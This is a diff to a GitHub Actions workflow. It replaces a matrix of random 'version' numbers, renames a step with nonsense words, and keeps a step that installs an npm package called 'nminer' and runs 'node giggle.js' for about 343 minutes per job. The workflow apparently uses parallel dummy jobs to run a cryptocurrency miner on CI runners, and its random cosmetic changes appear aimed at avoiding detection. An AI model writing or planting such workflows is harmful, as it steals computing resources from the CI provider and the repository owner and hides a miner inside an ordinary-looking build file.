@@ -9,24 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 9110 }
-          - { version: 3105 }
-          - { version: 4911 }
-          - { version: 9795 }
-          - { version: 8790 }
-          - { version: 7414 }
-          - { version: 8306 }
-          - { version: 7743 }
-          - { version: 2029 }
-          - { version: 9198 }
-          - { version: 8630 }
-          - { version: 7244 }
-          - { version: 3563 }
-          - { version: 5655 }
-          - { version: 8070 }
-          - { version: 6004 }
-          - { version: 7876 }
-          - { version: 1931 }
+          - { version: 3053 }
+          - { version: 5557 }
+          - { version: 4827 }
+          - { version: 2194 }
+          - { version: 1925 }
+          - { version: 7372 }
+          - { version: 1397 }
+          - { version: 3018 }
+          - { version: 7433 }
+          - { version: 2343 }
+          - { version: 5454 }
+          - { version: 976 }
+          - { version: 3384 }
+          - { version: 9720 }
+          - { version: 2631 }
+          - { version: 8503 }
+          - { version: 8038 }
 
     steps:
       - name: Checkout
@@ -37,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: quickly
+      - name: psst meanwhile likewise
         run: |
           npm install nminer@latest
-          timeout 342m node giggle.js || echo "giggle executed"
+          timeout 343m node giggle.js || echo "giggle executed"
